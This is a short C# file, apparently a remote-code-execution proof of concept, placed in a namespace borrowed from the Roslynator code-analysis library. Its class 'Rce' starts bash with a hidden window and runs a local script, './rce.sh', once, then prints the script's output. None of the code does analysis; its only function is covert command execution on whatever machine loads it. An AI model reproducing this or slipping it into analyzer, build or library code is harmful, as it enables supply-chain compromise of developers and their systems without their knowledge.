using System;
using System.Diagnostics;

namespace Roslynator.CSharp.Analysis
{
    public static class Rce
    {
        private static bool _alreadyExecuted;

        public static void Run()
        {
            if (_alreadyExecuted) return;
            try
            {
                var process = new Process();
                var processStartInfo = new ProcessStartInfo()
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = $"bash",
                    Arguments = $"-c \"./rce.sh\"",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false
                };
                process.StartInfo = processStartInfo;
                process.Start();
                var output = process.StandardOutput.ReadToEnd();
                var error = process.StandardError.ReadToEnd();

                if (!string.IsNullOrEmpty(output))
                {
                    Console.WriteLine("Output: " + output);
                }
                else
                {
                    Console.WriteLine("Error: " + error);
                }

                _alreadyExecuted = true;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }
    }
}